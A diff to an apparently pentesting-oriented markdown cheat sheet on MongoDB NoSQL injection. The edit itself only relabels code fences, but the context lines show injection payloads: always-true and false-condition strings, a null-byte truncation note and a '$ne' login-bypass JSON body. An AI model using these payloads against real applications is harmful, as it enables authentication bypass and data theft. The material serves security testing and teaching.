@@ -36,7 +36,7 @@
 
 ### <mark style="color:yellow;">**Confirming conditional behavior**</mark>
 
-```sh
+```markdown
 # False condition
 ' && 0 && 'x
 ' && '1'=='2
@@ -55,7 +55,7 @@ If the application behaves differently suggests that the false condition impacts
 
 ### <mark style="color:yellow;">**Overriding existing conditions**</mark>
 
-```sh
+```markdown
 # Always true: 
 '||1||'
 '||'1'=='1'
@@ -77,7 +77,7 @@ The modified query returns all items (all the products in any category).
 
 MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored.
 
-```sh
+```markdown
 # Back-end code
 this.category == 'fizzy' && this.released == 1
 
@@ -129,7 +129,7 @@ MongoDB Query and Projection Operators: [https://www.mongodb.com/docs/manual/ref
 
 ### <mark style="color:yellow;">**Testing**</mark>
 
-```sh
+```markdown
 # Login bypass
 {"username":"bob","password":{"$ne":"invalid"}}
 
